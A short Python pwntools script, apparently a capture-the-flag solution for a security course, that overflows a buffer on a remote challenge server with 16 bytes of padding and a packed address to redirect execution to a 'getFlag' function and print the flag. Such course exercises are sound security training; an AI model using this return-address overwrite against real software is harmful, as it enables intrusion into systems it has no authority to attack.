#!/usr/bin/python3

from pwn import *
from pwn import p64

io = remote('inf226.puffling.no', 7001)

# 00000000004011d6 <getFlag> from objdump -d ./01
line = cyclic(16) + p64(0x4011d6)
io.sendline(line)

recieved = io.recvall().decode()
flag = recieved.splitlines()[-1]
print(f'Flag 01: {flag}')